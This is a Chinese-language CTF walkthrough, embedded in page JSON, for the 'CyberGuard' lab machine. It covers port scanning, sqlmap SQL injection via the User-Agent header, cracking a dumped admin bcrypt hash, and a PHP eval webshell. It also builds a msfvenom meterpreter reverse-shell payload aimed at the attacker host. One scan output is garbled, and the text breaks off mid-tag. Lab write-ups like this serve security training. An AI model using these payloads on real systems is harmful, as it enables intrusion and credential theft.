_NEXT_DATA__" type="application/json">{"props":{"pageProps":{"postData":{"id":"TheHackersLabsCyberGuard","contentHtml":"\u003ch1\u003eCyberGuard\u003c/h1\u003e\n\u003cblockquote\u003e\n\u003cp\u003e\u003ca href=\"https://labs.thehackerslabs.com/machine/25\"\u003ehttps://labs.thehackerslabs.com/machine/25\u003c/a\u003e\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/TheHackersLabsCyberGuard/image.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e一共有四台机子：第一台是做路由器/防火墙。其余三台内网主机。\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/TheHackersLabsCyberGuard/image1.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003ch2\u003eRecon\u003c/h2\u003e\n\u003ch3\u003ePortScan\u003c/h3\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  CyberGuard nmap -sn 10.0.2.0/24                   \nStarting Nmap 7.95 ( https://nmap.org ) at 2025-07-27 21:11 CST\nNmap scan report \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e 10.0.2.1\nHost is up (0.00072s latency).\nMAC Address: 0A:00:27:00:00:11 (Unknown)\nNmap scan report \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e 10.0.2.10\nHost is up (0.00047s latency).\nMAC Address: 08:00:27:B3:85:B4 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\nNmap scan report \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e 10.0.2.20\nHost is up.\nNmap \u003cspan class=\"hljs-keyword\"\u003edone\u003c/span\u003e: 256 IP addresses (3 hosts up) scanned \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e 2.21 seconds\n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  CyberGuard nmap -sT -min-rate 10000 -p- 10.0.2.10\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-07-27 21:11 CST\nNmap scan report \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e 10.0.2.10\nHost is up (0.0013s latency).\nNot shown: 65534 filtered tcp ports (no-response)\nPORT   STATE SERVICE\n80/tcp open  http\nMAC Address: 08:00:27: ,zip -u http://10.0.2.10\n===============================================================\nGobuster v3.6\nby OJ Reeves (@TheColonial) \u0026#x26; Christian Mehlmauer (@firefart)\n===============================================================\n[+] Url:                     http://10.0.2.10\n[+] Method:                  GET\n[+] Threads:                 10\n[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt\n[+] Negative Status codes:   404\n[+] User Agent:              gobuster/3.6\n[+] Extensions:              php,zip\n[+] Timeout:                 10s\n===============================================================\nStarting gobuster \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e directory enumeration mode\n===============================================================\n/.php                 (Status: 403) [Size: 274]\n/index.php            (Status: 200) [Size: 1048]\n/search               (Status: 200) [Size: 2046]\n/admin                (Status: 302) [Size: 378] [--\u003e http://10.0.2.10/admin/auth/login]\n/up                   (Status: 200) [Size: 2130]\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e这个 \u003ccode\u003equery\u003c/code\u003e 和输出结果感觉有股熟悉的味\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/TheHackersLabsCyberGuard/image3.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e\u003ccode\u003esqlmap\u003c/code\u003e 跑一波\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003esqlmap -r packet -batch --level 3 --risk 3\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e真跑出来了，在 \u003ccode\u003eUA\u003c/code\u003e 中存在注入点\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/TheHackersLabsCyberGuard/image4.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003ch2\u003eSQL Injection\u003c/h2\u003e\n\u003cp\u003e使用 \u003ccode\u003esqlmap\u003c/code\u003e 直接全给爆出来\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003ecurrent database: \u003cspan class=\"hljs-string\"\u003e'cyberguard\ncurrent user: '\u003c/span\u003eian@localhost\u003cspan class=\"hljs-string\"\u003e'\n\n+------------------------+\n| cache                  |\n| admin_menu             |\n| admin_operation_log    |\n| admin_permissions      |\n| admin_role_menu        |\n| admin_role_permissions |\n| admin_role_users       |\n| admin_roles            |\n| admin_user_permissions |\n| admin_users            |\n| blacklist_user_agents  |\n| cache_locks            |\n| failed_jobs            |\n| job_batches            |\n| jobs                   |\n| migrations             |\n| password_reset_tokens  |\n| sessions               |\n| users                  |\n+------------------------+\n\n# admin_user\n+----+---------------+--------+--------------------------------------------------------------+----------+---------------------+---------------------+----------------+\n| id | name          | avatar | password                                                     | username | created_at          | updated_at          | remember_token |\n+----+---------------+--------+--------------------------------------------------------------+----------+---------------------+---------------------+----------------+\n| 1  | Administrator | NULL   | $2y$12$fN2GC9IgrwHneBpWIY8WwevYshq/qkEhoE6XhU7ClZInAhbW2YltK | admin    | 2024-10-01 17:41:30 | 2024-10-09 02:31:19 | NULL           |\n+----+---------------+--------+--------------------------------------------------------------+----------+---------------------+---------------------+----------------+\n\n\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e爆破一下密码\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  CyberGuard john --wordlist=/usr/share/wordlists/rockyou.txt \u003cspan class=\"hljs-built_in\"\u003ehash\u003c/span\u003e       \nUsing default input encoding: UTF-8\nLoaded 1 password \u003cspan class=\"hljs-built_in\"\u003ehash\u003c/span\u003e (bcrypt [Blowfish 32/64 X3])\nCost 1 (iteration count) is 4096 \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e all loaded hashes\nWill run 8 OpenMP threads\nPress \u003cspan class=\"hljs-string\"\u003e'q'\u003c/span\u003e or Ctrl-C to abort, almost any other key \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e status\nkiller           (?)     \n1g 0:00:00:04 DONE (2025-07-27 21:48) 0.2415g/s 34.78p/s 34.78c/s 34.78C/s shadow..sandra\nUse the \u003cspan class=\"hljs-string\"\u003e\"--show\"\u003c/span\u003e option to display all of the cracked passwords reliably\nSession completed. \n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e得到明文密码 \u003ccode\u003ekiller\u003c/code\u003e\u003c/p\u003e\n\u003ch2\u003e后台利用\u003c/h2\u003e\n\u003cp\u003e来到网站后台尝试进行登录\u003c/p\u003e\n\u003cp\u003e成功进入后台\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/TheHackersLabsCyberGuard/image5.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e后台里面有个命令执行的功能（图中的 \u003ccode\u003eshell\u003c/code\u003e）\u003c/p\u003e\n\u003cp\u003e成功执行命令\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/TheHackersLabsCyberGuard/image6.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e再拿 \u003ccode\u003e/etc/passwd\u003c/code\u003e 的信息，能知道 \u003ccode\u003eian\u003c/code\u003e 用户是存在的\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003eian:x:1000:1000:ian,,,:/home/ian:/bin/bash\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch3\u003e尝试 1 ❌\u003c/h3\u003e\n\u003cp\u003e尝试反弹 \u003ccode\u003eshell\u003c/code\u003e ，这里使用 \u003ccode\u003enc\u003c/code\u003e 和 \u003ccode\u003e/bin/bash\u003c/code\u003e 都无法弹出来，一直在加载\u003c/p\u003e\n\u003cp\u003e后台还有一个上传功能点，但是没找到上传的文件夹在哪\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/TheHackersLabsCyberGuard/image7.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e尝试使用命令行来找到上传的文件夹在哪\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003efind / -name \u003cspan class=\"hljs-string\"\u003e'result.php'\u003c/span\u003e 2\u003e/dev/null\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e通过 find 命令能找到存放在 \u003ccode\u003e/var/www/cyberguard/storage/app/private/result.php\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/TheHackersLabsCyberGuard/image8.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e再看一下当前目录在哪，在 \u003ccode\u003e/var/www/cyberguard/public\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/TheHackersLabsCyberGuard/image9.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e我们应该是没有办法切换过去\u003c/p\u003e\n\u003cp\u003e所以这里尝试直接写入\u003ccode\u003ewebshell\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e\u003cspan class=\"hljs-built_in\"\u003eecho\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e'\u0026#x3C;?php eval($_POST[\"x\"]);phpinfo();?\u003e'\u003c/span\u003e \u003e test.php\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e可以执行命令\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/TheHackersLabsCyberGuard/image10.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e但结果还是无法进行反弹 \u003ccode\u003eshell\u003c/code\u003e ，被阻止\u003c/p\u003e\n\u003ch3\u003e尝试 2 ❌\u003c/h3\u003e\n\u003cp\u003e尝试使用 \u003ccode\u003eMSF\u003c/code\u003e 来拿到 \u003ccode\u003eshell\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  CyberGuard msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.0.2.20 LPORT=4444 -f elf -o sunset\n[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload\n[-] No \u003cspan class=\"hljs-built_in\"\u003earch\u003c/span\u003e selected, selecting \u003cspan class=\"hljs-built_in\"\u003earch\u003c/span\u003e: x64 from the payload\nNo encoder specified, outputting raw payload\nPayload size: 130 bytes\nFinal size of elf file: 250 bytes\nSaved as: sunset\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e上传后在命令执行窗口执行如下命令\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e\u003csp
